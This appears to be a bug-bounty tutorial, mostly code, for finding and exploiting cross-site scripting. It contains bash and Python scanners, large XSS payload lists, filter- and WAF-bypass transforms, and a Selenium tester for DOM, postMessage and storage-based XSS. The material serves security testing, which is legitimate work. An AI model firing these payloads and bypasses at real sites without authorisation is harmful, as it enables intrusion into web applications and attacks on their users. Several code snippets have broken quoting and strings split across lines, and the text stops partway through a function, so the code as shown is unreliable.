# 🔥 Elite Advanced XSS & DOM-based XSS Testing Framework
## Advanced Techniques for $100-500+ Bug Bounty Rewards

### 🎯 Overview
XSS vulnerabilities remain one of the most common and rewarding bugs in bug bounty programs. This comprehensive framework covers everything from basic XSS detection to advanced DOM-based XSS exploitation techniques used by elite security researchers.

## 🛠️ Phase 1: XSS Discovery & Enumeration

### Automated XSS Endpoint Discovery
```bash
#!/bin/bash
# xss_discovery.sh - Discover XSS injection points

TARGET=$1
echo "🔍 Discovering XSS injection points for $TARGET"

# Method 1: Parameter-based discovery
echo "🎯 Finding URL parameters for XSS testing..."
cat live_urls.txt | gau | grep "=" | qsreplace "FUZZ" | sort -u > xss_parameters.txt
echo "✅ Found $(wc -l < xss_parameters.txt) potential XSS parameters"

# Method 2: Form-based discovery
echo "🔍 Analyzing forms for XSS injection points..."
for url in $(cat live_urls.txt); do
    curl -s "$url" | grep -i "input\|textarea\|select" | grep -v "hidden\|password" | while read line; do
        if echo "$line" | grep -q "name="; then
            param=$(echo "$line" | grep -oP 'name=["']?\K[^"'>\s]+')
            echo "$url|$param" >> form_xss_points.txt
        fi
    done
done

# Method 3: Header-based XSS discovery
echo "🔍 Testing header-based XSS injection points..."
cat > header_xss_points.txt << 'EOF'
User-Agent
Referer
X-Forwarded-For
X-Real-IP
X-Originating-IP
X-Remote-IP
X-Remote-Addr
X-Forwarded-Host
X-Forwarded-Proto
Accept
Accept-Language
Accept-Encoding
Cookie
Authorization
X-Requested-With
Origin
Host
X-Custom-Header
X-Forwarded-Server
X-ProxyUser-Ip
Client-IP
True-Client-IP
Cluster-Client-IP
X-Cluster-Client-IP
Forwarded-For
Forwarded
Via
X-Via
X-Forwarded
X-Forwarded-By
X-Forwarded-For-Original
X-Forwarded-Proto-Version
X-Real-Protocol
Front-End-Https
X-ATT-DeviceId
X-Wap-Profile
Profile
X-Device-User-Agent
X-Original-URL
X-Rewrite-URL
X-Forwarded-Prefix
CF-Connecting-IP
CF-IPCountry
CF-RAY
CF-Visitor
True-Client-IP
X-Appengine-Remote-Addr
Fastly-Client-IP
X-Varnish
X-Forwarded-Port
X-Forwarded-Ssl
X-Forwarded-Proto
EOF

# Method 4: JavaScript-based XSS discovery
echo "🔍 Analyzing JavaScript for potential XSS sinks..."
cat live_urls.txt | katana -d 3 -js-crawl | grep "\.js$" | httpx -silent -mc 200 | while read js_url; do
    echo "Analyzing: $js_url"
    curl -s "$js_url" | grep -E "(innerHTML|outerHTML|document\.write|eval|setTimeout|setInterval|Function|location\.href|location\.search|location\.hash)" | head -5 >> js_xss_sinks.txt
done

# Method 5: DOM-based XSS discovery
echo "🔍 Finding DOM-based XSS injection points..."
cat > dom_xss_sources.txt << 'EOF'
location.href
location.search
location.hash
location.pathname
document.URL
document.documentURI
document.baseURI
window.name
document.referrer
document.cookie
localStorage
sessionStorage
history.pushState
history.replaceState
postMessage
XMLHttpRequest.responseText
fetch().then()
WebSocket.onmessage
EventSource.onmessage
EOF

cat > dom_xss_sinks.txt << 'EOF'
innerHTML
outerHTML
insertAdjacentHTML
document.write
document.writeln
eval
setTimeout
setInterval
Function
execScript
msSetImmediate
range.createContextualFragment
crypto.generateCRMFRequest
ScriptElement.src
ScriptElement.text
ScriptElement.textContent
ScriptElement.innerText
anyTag.onEventName
location.href
location.replace
location.assign
open
showModalDialog
RegExp
EOF

echo "✅ XSS discovery completed!"
```

### Advanced XSS Parameter Discovery
```python
#!/usr/bin/env python3
# xss_param_discovery.py - Advanced XSS parameter discovery

import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import json
from bs4 import BeautifulSoup

class XSSParameterDiscovery:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # XSS test markers
        self.test_markers = [
            'xss_test_123',
            'XSS_MARKER_456',
            'test_reflection_789',
            'unique_xss_payload_abc',
            'reflection_test_def'
        ]
    
    def discover_reflection_points(self, url):
        """Discover parameters that reflect user input"""
        reflection_points = []
        
        try:
            # Parse URL to get existing parameters
            parsed_url = urlparse(url)
            existing_params = parse_qs(parsed_url.query)
            
            # Test existing parameters
            for param in existing_params:
                test_url = self.inject_test_marker(url, param, self.test_markers[0])
                if self.check_reflection(test_url, self.test_markers[0]):
                    reflection_points.append({
                        'url': url,
                        'parameter': param,
                        'type': 'GET',
                        'reflection_confirmed': True
                    })
                    print(f"✅ Reflection found: {param} in {url}")
            
            # Test common parameter names
            common_params = [
                'q', 'query', 'search', 'keyword', 'term', 'name', 'value', 'data',
                'input', 'text', 'content', 'message', 'comment', 'description',
                'title', 'subject', 'body', 'email', 'username', 'user', 'id',
                'page', 'view', 'action', 'cmd', 'command', 'exec', 'function',
                'method', 'type', 'format', 'output', 'callback', 'jsonp',
                'redirect', 'url', 'link', 'href', 'src', 'path', 'file',
                'debug', 'test', 'demo', 'example', 'sample', 'preview'
            ]
            
            for param in common_params:
                if param not in existing_params:
                    test_url = self.inject_test_marker(url, param, self.test_markers[1])
                    if self.check_reflection(test_url, self.test_markers[1]):
                        reflection_points.append({
                            'url': url,
                            'parameter': param,
                            'type': 'GET',
                            'reflection_confirmed': True
                        })
                        print(f"✅ New reflection found: {param} in {url}")
            
            # Test POST parameters via forms
            post_points = self.discover_post_reflection_points(url)
            reflection_points.extend(post_points)
            
        except Exception as e:
            print(f"❌ Error testing {url}: {str(e)}")
        
        return reflection_points
    
    def inject_test_marker(self, url, param, marker):
        """Inject test marker into URL parameter"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        params[param] = [marker]
        
        new_query = urlencode(params, doseq=True)
        new_url = urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        return new_url
    
    def check_reflection(self, url, marker):
        """Check if marker is reflected in response"""
        try:
            response = self.session.get(url, timeout=10)
            return marker in response.text
        except:
            return False
    
    def discover_post_reflection_points(self, url):
        """Discover POST-based reflection points"""
        reflection_points = []
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', url)
                method = form.get('method', 'GET').upper()
                
                if method == 'POST':
                    # Get form inputs
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    
                    for input_elem in inputs:
                        input_type = input_elem.get('type', 'text').lower()
                        input_name = input_elem.get('name')
                        
                        if input_name and input_type not in ['hidden', 'password', 'submit', 'button']:
                            # Test POST reflection
                            if self.test_post_reflection(action, input_name, self.test_markers[2]):
                                reflection_points.append({
                                    'url': action,
                                    'parameter': input_name,
                                    'type': 'POST',
                                    'reflection_confirmed': True
                                })
                                print(f"✅ POST reflection found: {input_name} in {action}")
        
        except Exception as e:
            pass
        
        return reflection_points
    
    def test_post_reflection(self, url, param, marker):
        """Test POST parameter reflection"""
        try:
            data = {param: marker}
            response = self.session.post(url, data=data, timeout=10)
            return marker in response.text
        except:
            return False
    
    def discover_header_reflection_points(self, url):
        """Discover header-based reflection points"""
        reflection_points = []
        
        headers_to_test = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
            'Accept', 'Accept-Language', 'Accept-Encoding',
            'X-Requested-With', 'Origin', 'Host'
        ]
        
        for header in headers_to_test:
            try:
                test_headers = {header: self.test_markers[3]}
                response = self.session.get(url, headers=test_headers, timeout=10)
                
                if self.test_markers[3] in response.text:
                    reflection_points.append({
                        'url': url,
                        'parameter': header,
                        'type': 'HEADER',
                        'reflection_confirmed': True
                    })
                    print(f"✅ Header reflection found: {header} in {url}")
            
            except Exception as e:
                continue
        
        return reflection_points

# Usage
def main():
    with open('live_urls.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    discoverer = XSSParameterDiscovery()
    all_reflection_points = []
    
    for url in urls[:50]:  # Limit for testing
        print(f"🎯 Testing reflection points in {url}")
        
        # Discover GET/POST reflection points
        reflection_points = discoverer.discover_reflection_points(url)
        all_reflection_points.extend(reflection_points)
        
        # Discover header reflection points
        header_points = discoverer.discover_header_reflection_points(url)
        all_reflection_points.extend(header_points)
    
    # Save results
    with open('xss_reflection_points.json', 'w') as f:
        json.dump(all_reflection_points, f, indent=2)
    
    print(f"✅ Discovery completed! Found {len(all_reflection_points)} reflection points")

if __name__ == "__main__":
    main()
```

## 💰 Phase 2: Advanced XSS Payload Generation & Testing

### 1. Context-Aware XSS Payload Generator
```python
#!/usr/bin/env python3
# context_aware_xss.py - Context-aware XSS payload generation

import requests
import re
import html
import json
from urllib.parse import quote, unquote
import base64

class ContextAwareXSSGenerator:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Context-specific payloads
        self.context_payloads = {
            'html_content': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src=javascript:alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<div onmouseover=alert("XSS")>hover</div>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus><option>test</select>',
                '<textarea onfocus=alert("XSS") autofocus>test</textarea>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>test</marquee>',
                '<video><source onerror=alert("XSS")>',
                '<audio src=x onerror=alert("XSS")>',
            ],
            
            'html_attribute': [
                '" onmouseover=alert("XSS") "',
                '" onfocus=alert("XSS") autofocus="',
                '" onclick=alert("XSS") "',
                '" onload=alert("XSS") "',
                '" onerror=alert("XSS") "',
                '' onmouseover=alert("XSS") '',
                '' onfocus=alert("XSS") autofocus='',
                '"><script>alert("XSS")</script>',
                ''><script>alert("XSS")</script>',
                '"><img src=x onerror=alert("XSS")>',
                ''><img src=x onerror=alert("XSS")>',
            ],
            
            'javascript_string': [
                '';alert("XSS");//',
                '";alert("XSS");//',
                '';alert(String.fromCharCode(88,83,83));//',
                '"+alert("XSS")+"',
                ''+alert("XSS")+'',
                '</script><script>alert("XSS")</script>',
                '\';alert("XSS");//',
                '\";alert("XSS");//',
            ],
            
            'javascript_variable': [
                'alert("XSS")',
                'prompt("XSS")',
                'confirm("XSS")',
                'console.log("XSS")',
                'document.write("XSS")',
                'eval("alert("XSS")")',
                'setTimeout("alert("XSS")",1)',
                'setInterval("alert("XSS")",1)',
                'Function("alert("XSS")")()',
            ],
            
            'url_parameter': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'data:text/html;base64,' + base64.b64encode(b'<script>alert("XSS")</script>').decode(),
                'vbscript:msgbox("XSS")',
                'livescript:alert("XSS")',
                'mocha:alert("XSS")',
            ],
            
            'css_context': [
                'expression(alert("XSS"))',
                'url(javascript:alert("XSS"))',
                'url(data:text/html,<script>alert("XSS")</script>)',
                '/**/expression(alert("XSS"))',
                'behavior:url(#default#userData)',
                '-moz-binding:url("data:text/xml,<bindings xmlns="http://www.mozilla.org/xbl"><binding><implementation><constructor>alert("XSS")</constructor></implementation></binding></bindings>")',
            ],
            
            'json_context': [
                '{"xss":"</script><script>alert("XSS")</script>"}',
                '{"xss":"\u003cscript\u003ealert("XSS")\u003c/script\u003e"}',
                '{"xss":"<img src=x onerror=alert("XSS")>"}',
                '{"xss":"javascript:alert("XSS")"}',
            ],
            
            'xml_context': [
                '<![CDATA[<script>alert("XSS")</script>]]>',
                '&lt;script&gt;alert("XSS")&lt;/script&gt;',
                '<script><![CDATA[alert("XSS")]]></script>',
            ]
        }
        
        # WAF bypass techniques
        self.waf_bypass_techniques = [
            self.case_variation,
            self.encoding_bypass,
            self.comment_insertion,
            self.whitespace_variation,
            self.tag_variation,
            self.event_handler_variation,
            self.protocol_variation,
            self.unicode_bypass
        ]
    
    def detect_context(self, url, param, test_value="CONTEXT_TEST_123"):
        """Detect the context where user input is reflected"""
        try:
            # Inject test value
            if '=' in url:
                test_url = url.replace(f'{param}=', f'{param}={test_value}')
            else:
                test_url = f"{url}?{param}={test_value}"
            
            response = self.session.get(test_url, timeout=10)
            content = response.text
            
            # Analyze context
            contexts = []
            
            # Check HTML content context
            if re.search(f'>{test_value}<', content):
                contexts.append('html_content')
            
            # Check HTML attribute context
            if re.search(f'["'][^"']*{test_value}[^"']*["']', content):
                contexts.append('html_attribute')
            
            # Check JavaScript string context
            if re.search(f'["'][^"']*{test_value}[^"']*["']', content) and 'script' in content.lower():
                contexts.append('javascript_string')
            
            # Check JavaScript variable context
            if re.search(f'var\s+\w+\s*=\s*["']?{test_value}["']?', content):
                contexts.append('javascript_variable')
            
            # Check URL parameter context
            if re.search(f'href\s*=\s*["'][^"']*{test_value}', content):
                contexts.append('url_parameter')
            
            # Check CSS context
            if re.search(f'style\s*=\s*["'][^"']*{test_value}', content):
                contexts.append('css_context')
            
            # Check JSON context
            if re.search(f'["']\s*:\s*["'][^"']*{test_value}', content):
                contexts.append('json_context')
            
            # Check XML context
            if '<?xml' in content and test_value in content:
                contexts.append('xml_context')
            
            return contexts if contexts else ['html_content']  # Default context
            
        except Exception as e:
            return ['html_content']  # Default context on error
    
    def generate_context_payloads(self, contexts):
        """Generate payloads based on detected contexts"""
        payloads = []
        
        for context in contexts:
            if context in self.context_payloads:
                payloads.extend(self.context_payloads[context])
        
        return payloads
    
    def case_variation(self, payload):
        """Apply case variations to bypass filters"""
        variations = []
        variations.append(payload.upper())
        variations.append(payload.lower())
        variations.append(payload.swapcase())
        
        # Mixed case for specific tags
        mixed_case_payload = payload
        mixed_case_payload = re.sub(r'<script>', '<ScRiPt>', mixed_case_payload, flags=re.IGNORECASE)
        mixed_case_payload = re.sub(r'</script>', '</ScRiPt>', mixed_case_payload, flags=re.IGNORECASE)
        mixed_case_payload = re.sub(r'alert', 'AlErT', mixed_case_payload, flags=re.IGNORECASE)
        variations.append(mixed_case_payload)
        
        return variations
    
    def encoding_bypass(self, payload):
        """Apply various encoding techniques"""
        variations = []
        
        # URL encoding
        variations.append(quote(payload))
        variations.append(quote(quote(payload)))  # Double encoding
        
        # HTML entity encoding
        html_encoded = html.escape(payload)
        variations.append(html_encoded)
        
        # Unicode encoding
        unicode_payload = payload
        unicode_payload = unicode_payload.replace('<', '\u003c')
        unicode_payload = unicode_payload.replace('>', '\u003e')
        unicode_payload = unicode_payload.replace('"', '\u0022')
        unicode_payload = unicode_payload.replace("'", '\u0027')
        variations.append(unicode_payload)
        
        # Hex encoding
        hex_payload = ''.join(f'\x{ord(c):02x}' for c in payload)
        variations.append(hex_payload)
        
        return variations
    
    def comment_insertion(self, payload):
        """Insert comments to bypass filters"""
        variations = []
        
        # HTML comments
        comment_payload = payload.replace('<script>', '<script/**/>')
        comment_payload = comment_payload.replace('alert', 'ale/**/rt')
        variations.append(comment_payload)
        
        # JavaScript comments
        js_comment_payload = payload.replace('alert(', 'alert/**/(')
        js_comment_payload = js_comment_payload.replace('script>', 'script//
>')
        variations.append(js_comment_payload)
        
        return variations
    
    def whitespace_variation(self, payload):
        """Add various whitespace characters"""
        variations = []
        
        # Tab characters
        tab_payload = payload.replace(' ', '	')
        variations.append(tab_payload)
        
        # Newline characters
        newline_payload = payload.replace(' ', '
')
        variations.append(newline_payload)
        
        # Multiple spaces
        space_payload = payload.replace(' ', '   ')
        variations.append(space_payload)
        
        # Mixed whitespace
        mixed_payload = payload.replace('<script>', '<	script
>')
        mixed_payload = mixed_payload.replace('alert(', 'alert	
(')
        variations.append(mixed_payload)
        
        return variations
    
    def tag_variation(self, payload):
        """Use alternative tags and attributes"""
        variations = []
        
        if '<script>' in payload:
            # Alternative script tags
            variations.append(payload.replace('<script>', '<script type="text/javascript">'))
            variations.append(payload.replace('<script>', '<script language="javascript">'))
            
            # Alternative execution methods
            variations.append('<img src=x onerror=alert("XSS")>')
            variations.append('<svg onload=alert("XSS")>')
            variations.append('<iframe src=javascript:alert("XSS")>')
            variations.append('<body onload=alert("XSS")>')
            variations.append('<input onfocus=alert("XSS") autofocus>')
        
        return variations
    
    def event_handler_variation(self, payload):
        """Use different event handlers"""
        variations = []
        
        event_handlers = [
            'onload', 'onerror', 'onclick', 'onmouseover', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
            'onkeydown', 'onkeyup', 'onkeypress', 'onmousedown',
            'onmouseup', 'onmousemove', 'onmouseout', 'onmouseenter',
            'onmouseleave', 'ondblclick', 'oncontextmenu', 'onwheel',
            'ondrag', 'ondragstart', 'ondragend', 'ondragover',
            'ondragenter', 'ondragleave', 'ondrop', 'onscroll',
            'onresize', 'onhashchange', 'onpageshow', 'onpagehide'
        ]
        
        for handler in event_handlers:
            variation = f'<img src=x {handler}=alert("XSS")>'
            variations.append(variation)
        
        return variations
    
    def protocol_variation(self, payload):
        """Use different protocols"""
        variations = []
        
        protocols = [
            'javascript:', 'data:', 'vbscript:', 'livescript:',
            'mocha:', 'jscript:', 'ecmascript:', 'about:'
        ]
        
        for protocol in protocols:
            if protocol == 'data:':
                variation = f'{protocol}text/html,<script>alert("XSS")</script>'
            else:
                variation = f'{protocol}alert("XSS")'
            variations.append(variation)
        
        return variations
    
    def unicode_bypass(self, payload):
        """Use Unicode characters for bypass"""
        variations = []
        
        # Unicode normalization bypass
        unicode_payload = payload
        unicode_payload = unicode_payload.replace('script', 'ſcript')  # Long s
        unicode_payload = unicode_payload.replace('alert', 'аlert')   # Cyrillic a
        variations.append(unicode_payload)
        
        # Zero-width characters
        zw_payload = payload.replace('<script>', '<\u200bscript\u200b>')
        variations.append(zw_payload)
        
        return variations
    
    def test_xss_payload(self, url, param, payload, method='GET'):
        """Test XSS payload and check for execution"""
        try:
            if method.upper() == 'GET':
                if '=' in url:
                    test_url = url.replace(f'{param}=', f'{param}={quote(payload)}')
                else:
                    test_url = f"{url}?{param}={quote(payload)}"
                
                response = self.session.get(test_url, timeout=10)
            else:
                data = {param: payload}
                response = self.session.post(url, data=data, timeout=10)
            
            # Check for payload execution indicators
            execution_indicators = [
                payload in response.text,  # Direct reflection
                'alert(' in response.text and 'XSS' in response.text,  # Alert execution
                '<script>' in response.text and payload.replace('<script>', '') in response.text,  # Script tag
                'onerror=' in response.text and 'alert' in response.text,  # Event handler
                'javascript:' in response.text and 'alert' in response.text,  # JavaScript protocol
            ]
            
            if any(execution_indicators):
                return {
                    'vulnerable': True,
                    'payload': payload,
                    'response_snippet': response.text[:500],
                    'status_code': response.status_code
                }
        
        except Exception as e:
            pass
        
        return {'vulnerable': False, 'payload': payload}

# Usage
def main():
    # Load reflection points
    try:
        with open('xss_reflection_points.json', 'r') as f:
            reflection_points = json.load(f)
    except FileNotFoundError:
        print("❌ No reflection points found. Run xss_param_discovery.py first.")
        return
    
    generator = ContextAwareXSSGenerator()
    all_results = []
    
    for point in reflection_points:
        url = point['url']
        param = point['parameter']
        method = point.get('type', 'GET')
        
        print(f"🎯 Testing XSS in {param} at {url}")
        
        # Detect context
        contexts = generator.detect_context(url, param)
        print(f"🔍 Detected contexts: {contexts}")
        
        # Generate context-aware payloads
        base_payloads = generator.generate_context_payloads(contexts)
        
        # Apply WAF bypass techniques
        all_payloads = []
        for payload in base_payloads:
            all_payloads.append(payload)  # Original payload
            
            # Apply bypass techniques
            for technique in generator.waf_bypass_techniques:
                try:
                    bypassed_payloads = technique(payload)
                    all_payloads.extend(bypassed_payloads)
                except:
                    continue
        
        # Test payloads
        for payload in all_payloads[:50]:  # Limit payloads per parameter
            result = generator.test_xss_payload(url, param, payload, method)
            if result['vulnerable']:
                result.update({
                    'url': url,
                    'parameter': param,
                    'method': method,
                    'contexts': contexts
                })
                all_results.append(result)
                print(f"🔥 XSS FOUND: {payload[:50]}...")
                break  # Stop on first successful payload
    
    # Save results
    with open('xss_vulnerabilities.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ XSS testing completed! Found {len(all_results)} vulnerabilities")

if __name__ == "__main__":
    main()
```

### 2. DOM-based XSS Detection Framework
```python
#!/usr/bin/env python3
# dom_xss_detector.py - Advanced DOM-based XSS detection

import requests
import re
import json
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import hashlib

class DOMXSSDetector:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Setup headless Chrome
        self.setup_browser()
        
        # DOM XSS sources (user-controllable input)
        self.dom_sources = [
            'location.href',
            'location.search',
            'location.hash',
            'location.pathname',
            'document.URL',
            'document.documentURI',
            'document.baseURI',
            'window.name',
            'document.referrer',
            'document.cookie',
            'localStorage',
            'sessionStorage',
            'history.pushState',
            'history.replaceState',
            'postMessage',
            'XMLHttpRequest.responseText',
            'fetch().then()',
            'WebSocket.onmessage',
            'EventSource.onmessage'
        ]
        
        # DOM XSS sinks (dangerous functions)
        self.dom_sinks = [
            'innerHTML',
            'outerHTML',
            'insertAdjacentHTML',
            'document.write',
            'document.writeln',
            'eval',
            'setTimeout',
            'setInterval',
            'Function',
            'execScript',
            'msSetImmediate',
            'range.createContextualFragment',
            'crypto.generateCRMFRequest',
            'ScriptElement.src',
            'ScriptElement.text',
            'ScriptElement.textContent',
            'ScriptElement.innerText',
            'location.href',
            'location.replace',
            'location.assign',
            'open',
            'showModalDialog',
            'RegExp'
        ]
        
        # DOM XSS test payloads
        self.dom_payloads = [
            # Hash-based payloads
            '#<script>alert("DOM_XSS")</script>',
            '#<img src=x onerror=alert("DOM_XSS")>',
            '#<svg onload=alert("DOM_XSS")>',
            '#javascript:alert("DOM_XSS")',
            
            # Search parameter payloads
            '?search=<script>alert("DOM_XSS")</script>',
            '?q=<img src=x onerror=alert("DOM_XSS")>',
            '?query=<svg onload=alert("DOM_XSS")>',
            
            # Name-based payloads (window.name)
            'DOM_XSS_TEST_<script>alert("DOM_XSS")</script>',
            
            # PostMessage payloads
            '{"type":"message","data":"<script>alert("DOM_XSS")</script>"}',
            
            # JSON payloads
            '{"xss":"<script>alert("DOM_XSS")</script>"}',
            
            # Advanced payloads
            '#<iframe src=javascript:alert("DOM_XSS")>',
            '#<body onload=alert("DOM_XSS")>',
            '#<input onfocus=alert("DOM_XSS") autofocus>',
            '#<details open ontoggle=alert("DOM_XSS")>',
            '#<marquee onstart=alert("DOM_XSS")>test</marquee>',
        ]
    
    def setup_browser(self):
        """Setup headless Chrome browser"""
        chrome_options = Options()
        chrome_options.add_argument('--headless')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        
        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(30)
        except Exception as e:
            print(f"❌ Failed to setup browser: {e}")
            self.driver = None
    
    def analyze_javascript_sources_sinks(self, url):
        """Analyze JavaScript code for DOM XSS sources and sinks"""
        sources_found = []
        sinks_found = []
        
        try:
            # Get the page
            response = self.session.get(url, timeout=10)
            content = response.text
            
            # Extract JavaScript code
            js_code_blocks = re.findall(r'<script[^>]*>(.*?)</script>', content, re.DOTALL | re.IGNORECASE)
            
            # Also get external JS files
            js_files = re.findall(r'<script[^>]*src=["']([^"']+)["']', content, re.IGNORECASE)
            
            for js_file in js_files:
                if not js_file.startswith('http'):
                    js_file = url.rstrip('/') + '/' + js_file.lstrip('/')
                
                try:
                    js_response = self.session.get(js_file, timeout=10)
                    js_code_blocks.append(js_response.text)
                except:
                    continue
            
            # Analyze JavaScript code for sources and sinks
            all_js_code = '
'.join(js_code_blocks)
            
            for source in self.dom_sources:
                if source in all_js_code:
                    sources_found.append(source)
            
            for sink in self.dom_sinks:
                if sink in all_js_code:
                    sinks_found.append(sink)
            
            return sources_found, sinks_found, all_js_code
            
        except Exception as e:
            return [], [], ""
    
    def test_dom_xss_with_browser(self, url):
        """Test DOM XSS using browser automation"""
        if not self.driver:
            return []
        
        results = []
        
        for payload in self.dom_payloads:
            try:
                # Construct test URL
                if payload.startswith('#'):
                    test_url = url + payload
                elif payload.startswith('?'):
                    test_url = url + payload
                else:
                    # For other payloads, try different injection points
                    test_urls = [
                        f"{url}#{payload}",
                        f"{url}?test={payload}",
                        f"{url}?search={payload}",
                        f"{url}?q={payload}"
                    ]
                    
                    for test_url in test_urls:
                        result = self.check_dom_xss_execution(test_url, payload)
                        if result:
                            results.append(result)
                            break
                    continue
                
                result = self.check_dom_xss_execution(test_url, payload)
                if result:
                    results.append(result)
                    
            except Exception as e:
                continue
        
        return results
    
    def check_dom_xss_execution(self, test_url, payload):
        """Check if DOM XSS payload executed"""
        try:
            # Set up alert detection
            self.driver.execute_script("""
                window.xss_detected = false;
                window.original_alert = window.alert;
                window.alert = function(msg) {
                    window.xss_detected = true;
                    window.xss_message = msg;
                    console.log('XSS Alert detected: ' + msg);
                };
            """)
            
            # Navigate to test URL
            self.driver.get(test_url)
            
            # Wait a bit for JavaScript execution
            time.sleep(2)
            
            # Check if alert was triggered
            xss_detected = self.driver.execute_script("return window.xss_detected;")
            
            if xss_detected:
                xss_message = self.driver.execute_script("return window.xss_message;")
                
                return {
                    'url': test_url,
                    'payload': payload,
                    'xss_detected': True,
                    'alert_message': xss_message,
                    'vulnerability_type': 'DOM XSS'
                }
            
            # Also check for console errors that might indicate XSS
            logs = self.driver.get_log('browser')
            for log in logs:
                if 'DOM_XSS' in log['message']:
                    return {
                        'url': test_url,
                        'payload': payload,
                        'xss_detected': True,
                        'console_message': log['message'],
                        'vulnerability_type': 'DOM XSS (Console)'
                    }
            
        except Exception as e:
            pass
        
        return None
    
    def test_postmessage_xss(self, url):
        """Test PostMessage-based DOM XSS"""
        if not self.driver:
            return []
        
        results = []
        
        try:
            self.driver.get(url)
            
            # Check if page listens to postMessage
            has_postmessage = self.driver.execute_script("""
                return document.body.innerHTML.includes('postMessage') || 
                       document.body.innerHTML.includes('addEventListener') ||
                       window.onmessage !== null;
            """)
            
            if has_postmessage:
                # Set up XSS detection
                self.driver.execute_script("""
                    window.xss_detected = false;
                    window.original_alert = window.alert;
                    window.alert = function(msg) {
                        window.xss_detected = true;
                        window.xss_message = msg;
                    };
                """)
                
                # Test PostMessage XSS payloads
                postmessage_payloads = [
                    '<script>alert("PostMessage_XSS")</script>',
                    '<img src=x onerror=alert("PostMessage_XSS")>',
                    '{"type":"xss","data":"<script>alert("PostMessage_XSS")</script>"}',
                    'javascript:alert("PostMessage_XSS")',
                ]
                
                for payload in postmessage_payloads:
                    try:
                        # Send PostMessage
                        self.driver.execute_script(f"""
                            window.postMessage({json.dumps(payload)}, '*');
                        """)
                        
                        time.sleep(1)
                        
                        # Check if XSS was triggered
                        xss_detected = self.driver.execute_script("return window.xss_detected;")
                        
                        if xss_detected:
                            results.append({
                                'url': url,
                                'payload': payload,
                                'xss_detected': True,
                                'vulnerability_type': 'PostMessage DOM XSS'
                            })
                            break
                    except:
                        continue
        
        except Exception as e:
            pass
        
        return results
    
    def test_webstorage_xss(self, url):
        """Test WebStorage-based DOM XSS"""
        if not self.driver:
            return []
        
        results = []
        
        try:
            self.driver.get(url)
            
            # Set up XSS detection
            self.driver.execute_script("""
                window.xss_detected = false;
                window.original_alert = window.alert;
                window.alert = function(msg) {
                    window.xss_detected = true;
                    window.xss_message = msg;
                };
            """)
            
            # Test localStorage XSS
            storage_payloads = [
                '<script>alert("Storage_XSS")</script>',
                '<img src=x onerror=alert("Storage_XSS")>',
                'javascript:alert("Storage_XSS")',
            ]
            
            for payload in storage_payloads:
                try:
                    # Set localStorage
                    self.driver.execute_script(f"""
                        localStorage.setItem('xss_test', {json.dumps(payload)});
                        sessionStorage.setItem('xss_test', {json.dumps(payload)});
                    """)
                    
                    # Refresh page to trigger potential XSS
                    self.driver.refresh()
                    time.sleep(2)
                    
                    # Check if XSS was triggered
                    xss_detected = self.driver.execute_script("return window.xss_detected;")
                    
                    if xss_detected:
                        results.append({
                            'url': url,
                            'payload': payload,
                            'xss_detected': True,
                            'vulnerability_type': 'WebStorage DOM XSS'
                        })
                        break
                except:
                    continue
        
        except Exception as e:
            pass
        
        return results
    
    def cleanup(self):
        """Cleanup browser resources"""
        if self.driver:
            self.driver.quit()

# Usage
def main():
    with open('live_urls.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    detector = DOMXSSDetector()
    all_results = []
    
    try:
        for url in urls[:20]:  # Limit for testing
            print(f"🎯 Testing DOM XSS on {url}")
            
            # Analyze JavaScript sources and sinks
            sources, sinks, js_code = detector.analyze_javascript_sources_sinks(url)
            
            if sources and sinks:
                print(f"🔍 Found {len(sources)} sources and {len(sinks)} sinks")
                
                # Test DOM XSS with browser
                dom_results = detector.test_dom_xss_with_browser(url)
                all_results.extend(dom_results)
                
                # Test PostMessage XSS
                postmessage_results = detector.test_postmessage_xss(url)
                all_results.extend(postmessage_results)
                
                # Test WebStorage XSS
                storage_results = detector.test_webstorage_xss(url)
                all_results.extend(storage_results)
                
                # Save analysis results
                analysis_result = {
                    'url': url,
                    'sources_found': sources,
                    'sinks_found': sinks,
                    'potential_dom_xss': len(sources) > 0 and len(sinks) > 0
                }
                all_results.append(analysis_result)
    
    finally:
        detector.cleanup()
    
    # Save results
    with open('dom_xss_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
